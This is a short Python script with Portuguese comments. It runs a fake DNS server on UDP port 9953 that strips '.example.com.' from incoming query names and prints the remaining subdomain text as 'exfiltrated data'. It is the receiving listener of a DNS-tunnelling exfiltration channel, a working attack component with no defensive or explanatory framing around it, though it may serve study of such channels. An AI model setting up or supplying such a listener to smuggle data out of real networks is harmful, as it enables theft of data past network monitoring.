###############################################################
# Imports
###############################################################
import socket
from dnslib import DNSRecord, QTYPE, RR, A
import time

###############################################################
# Vars. Global
###############################################################
_DNS_ADDR = ('0.0.0.0', 9953)
_FAKE_DOMAIN = '.example.com.'


###############################################################
# Classes e Funções
###############################################################
def decode_request(request):
    data = request.replace(_FAKE_DOMAIN, '')
    return data

def start_dns_server():
    # Cria um socket para ouvir requisições DNS
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(_DNS_ADDR)
    print("Servidor DNS ouvindo na porta 9953...")
    
    while True:
        try:
            data, addr = sock.recvfrom(512)
            
            # Lê a requisição DNS
            request = DNSRecord.parse(data)
            print(f'DNS PARSE: {request}')
            domain = str(request.q.qname)
            print(f'REQUEST.Q>NAME: {domain}')
            
            # Decodifica os dados do domínio
            decoded_data = decode_request(domain)
            decoded_data = decoded_data.replace('\\032', ' ')
            print(f"Dados exfiltrados: {decoded_data}")
            
            
            
            # Criando um objeto DNSRecord para a resposta
            dns_response = DNSRecord()
            # Adicionando uma resposta DNS
            #dns_response.add_answer(RR('www.example.com', QTYPE.A, rdata=A('192.0.2.1')))
            # Convertendo a resposta para uma representação de bytes
            response_bytes = dns_response.pack()
            print(response_bytes.hex())  # Exibindo a resposta em hexadecimal

            #time.sleep(8)
            # Envia a resposta DNS de volta para o cliente
            sock.sendto(response_bytes, addr)

        except Exception as e:
            print(e)


###############################################################
# Main
###############################################################
if __name__ == "__main__":
    start_dns_server()
